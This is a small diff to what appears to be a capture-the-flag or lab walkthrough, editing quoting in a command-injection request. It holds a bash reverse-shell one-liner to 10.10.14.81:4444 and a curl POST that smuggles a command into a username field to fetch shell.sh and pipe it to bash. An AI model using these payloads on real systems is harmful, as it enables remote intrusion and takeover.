@@ -149,7 +149,7 @@ bash -c "bash -i >& /dev/tcp/10.10.14.81/4444 0>&1"
 
 ```bash
 curl -X POST 'http://10.10.11.224:55555/emsec' \
-  --data 'username=;`curl http://10.10.14.81/shell.sh|bash`'
+  --data "username=;'curl http://10.10.14.81/shell.sh|bash'"
 ```
 
 * Upgrading Shell to Fully Interactive TTYs :
